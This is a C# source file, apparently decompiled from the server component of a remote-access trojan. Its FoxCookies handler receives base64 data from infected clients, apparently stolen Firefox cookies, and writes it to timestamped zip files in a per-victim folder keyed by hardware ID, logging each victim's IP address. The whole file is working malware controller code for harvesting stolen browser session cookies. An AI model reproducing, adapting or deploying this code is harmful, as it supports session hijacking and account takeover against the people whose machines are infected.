using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200005B RID: 91
	public class FoxCookies
	{
		// Token: 0x060002D6 RID: 726 RVA: 0x0001E350 File Offset: 0x0001C550
		public FoxCookies(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Cookies");
				string asString = unpack_msgpack.ForcePathObject("Data").AsString;
				if (!string.IsNullOrWhiteSpace(asString))
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllBytes(text + "\\FoxCookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", Convert.FromBase64String(asString));
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" FoxCookies was saved successfully @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ Cookies"
					}), Color.Purple);
				}
				else
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " has no Cookies", Color.MediumPurple);
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
